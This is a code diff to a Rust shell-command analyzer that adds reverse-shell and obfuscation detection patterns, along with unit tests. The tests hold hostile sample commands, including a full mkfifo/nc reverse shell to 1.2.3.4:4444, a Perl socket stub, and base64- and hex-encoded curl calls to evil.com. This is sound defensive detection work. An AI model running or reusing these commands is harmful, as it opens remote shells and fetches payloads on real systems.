@@ -83,6 +83,19 @@ const REVERSE_SHELL_INDICATORS: &[&str] = &[
     "socat udp",
     "0>&1",
     ">&/dev/tcp",
+    // Python reverse shells
+    "socket.socket",
+    "subprocess.call",
+    "pty.spawn",
+    // Perl reverse shells
+    "perl -e 'use socket",
+    "perl -mio -e",
+    // PHP reverse shells
+    "php -r '$sock=fsockopen",
+    // Ruby reverse shells
+    "ruby -rsocket -e",
+    // Telnet reverse shell
+    "mkfifo /tmp/",
 ];
 
 const PERSISTENCE_INDICATORS: &[&str] = &[
@@ -100,13 +113,45 @@ const PERSISTENCE_INDICATORS: &[&str] = &[
 ];
 
 const OBFUSCATION_INDICATORS: &[&str] = &[
+    // Base64 decode pipelines
     "base64 -d",
     "base64 --decode",
+    // OpenSSL / hex decode
     "openssl enc -d",
     "| xxd -r",
+    // Eval wrappers
     "eval $(echo",
     "eval \"$(echo",
     "eval `echo",
+    "eval $(base64",
+    "eval $(printf",
+    // Reversed string tricks
+    "| rev |",
+    "| rev|",
+    // printf-based decode
+    "printf '%s'",
+    "printf \"%s\"",
+    "printf '\\x",
+    "printf \"\\x",
+    // echo hex decode
+    "echo -e '\\x",
+    "echo -e \"\\x",
+    "echo -ne '\\x",
+    "echo -ne \"\\x",
+    // Python/Perl/Ruby inline exec
+    "python -c \"import os",
+    "python3 -c \"import os",
+    "python -c 'import os",
+    "python3 -c 'import os",
+    "python -c \"import subprocess",
+    "python3 -c \"import subprocess",
+    "perl -e 'system",
+    "perl -e \"system",
+    "perl -e 'exec",
+    "ruby -e '`",
+    "ruby -e 'system",
+    // Bash hex escape syntax
+    "$'\\x",
 ];
 
 // ---------------------------------------------------------------------------
@@ -1254,5 +1299,85 @@ mod tests {
                 .any(|s| s.as_str() == Some("download_and_execute"));
             assert!(has_dle, "should include download_and_execute signal");
         }
+    }
+
+    #[test]
+    fn detects_python_reverse_shell() {
+        let mut p = tree_sitter::Parser::new();
+        p.set_language(&tree_sitter_bash::LANGUAGE.into()).unwrap();
+        let signals = analyze_ast(
+            &mut p,
+            "python3 -c 'import socket,subprocess;s=socket.socket()'",
+        );
+        assert!(
+            signals.iter().any(|s| s.kind == SignalKind::ReverseShell),
+            "should detect python reverse shell: {signals:?}"
+        );
+    }
+
+    #[test]
+    fn detects_hex_echo_obfuscation() {
+        let mut p = tree_sitter::Parser::new();
+        p.set_language(&tree_sitter_bash::LANGUAGE.into()).unwrap();
+        let signals = analyze_ast(&mut p, "echo -e '\\x63\\x75\\x72\\x6c' | sh");
+        assert!(
+            signals
+                .iter()
+                .any(|s| s.kind == SignalKind::Obfuscated
+                    || s.kind == SignalKind::DownloadAndExecute),
+            "should detect hex echo obfuscation: {signals:?}"
+        );
+    }
+
+    #[test]
+    fn detects_eval_base64_decode() {
+        let mut p = tree_sitter::Parser::new();
+        p.set_language(&tree_sitter_bash::LANGUAGE.into()).unwrap();
+        let signals = analyze_ast(
+            &mut p,
+            "eval $(echo 'Y3VybCBodHRwOi8vZXZpbC5jb20K' | base64 -d)",
+        );
+        assert!(
+            signals.iter().any(|s| s.kind == SignalKind::Obfuscated),
+            "should detect eval+base64: {signals:?}"
+        );
+    }
+
+    #[test]
+    fn detects_perl_reverse_shell() {
+        let mut p = tree_sitter::Parser::new();
+        p.set_language(&tree_sitter_bash::LANGUAGE.into()).unwrap();
+        let signals = analyze_ast(&mut p, "perl -e 'use socket;$i=\"1.2.3.4\";$p=4444;'");
+        assert!(
+            signals.iter().any(|s| s.kind == SignalKind::ReverseShell),
+            "should detect perl reverse shell: {signals:?}"
+        );
+    }
+
+    #[test]
+    fn detects_mkfifo_reverse_shell() {
+        let mut p = tree_sitter::Parser::new();
+        p.set_language(&tree_sitter_bash::LANGUAGE.into()).unwrap();
+        let signals = analyze_ast(
+            &mut p,
+            "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 1.2.3.4 4444 > /tmp/f",
+        );
+        assert!(
+            signals.iter().any(|s| s.kind == SignalKind::ReverseShell),
+            "should detect mkfifo reverse shell: {signals:?}"
+        );
+    }
+
+    #[test]
+    fn detects_bash_hex_escape() {
+        let argv = vec![
+            "$'\\x63\\x75\\x72\\x6c'".to_string(),
+            "http://evil.com".to_string(),
+        ];
+        let signals = analyze_argv(&argv);
+        assert!(
+            signals.iter().any(|s| s.kind == SignalKind::Obfuscated),
+            "should detect bash hex escape: {signals:?}"
+        );
     }
 }
